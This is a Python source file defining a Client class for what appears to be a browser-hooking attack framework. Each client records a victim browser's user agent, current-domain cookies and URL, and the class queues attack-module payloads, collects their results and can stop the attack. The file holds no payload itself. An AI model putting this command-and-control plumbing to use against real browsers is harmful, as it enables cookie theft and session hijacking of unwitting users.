import json
from queue import Queue
import time
import threading 
import  _thread

class Client:
    def __init__(self,clientid,project,clientinfo) -> None:
        self.clientid=clientid
        self.project=project
        self.useragent=clientinfo['useragent']
        self.curdomaincookies=clientinfo['curdomaincookies']
        self.cururl=clientinfo['cururl']
        self.taskqueue=Queue()
        self.stopattack=False
        self.taskresult={}
        self.tasksemaphore={}

    def get_latest_task(self):
        try:
            return self.taskqueue.get(False)
        except:
            return None

    def stop_attack(self):
        self.stopattack=True
        self.taskqueue=Queue()

    
    def send_payload(self,moduleobj,callback=None):
        if self.stopattack:
            raise Exception("Attack on this client should be stopped")
        payload=moduleobj.payload
        payload.set_client(self)
        taskid=payload.taskid
        semaphore=threading.Semaphore(0)
        self.tasksemaphore[taskid]=semaphore
        self.taskqueue.put(payload)
        if not callback:
            semaphore.acquire()
            return self.taskresult[taskid] 
        elif callable(callback):
            def thread_callback():
                semaphore.acquire()
                callback(self,self.taskresult[taskid] ) #callback(client,)
            _thread.start_new_thread( thread_callback, tuple())
        return taskid
    
    def get_taskresult(self,taskid):
        if taskid in self.taskresult:
            return self.taskresult[taskid] 
        return None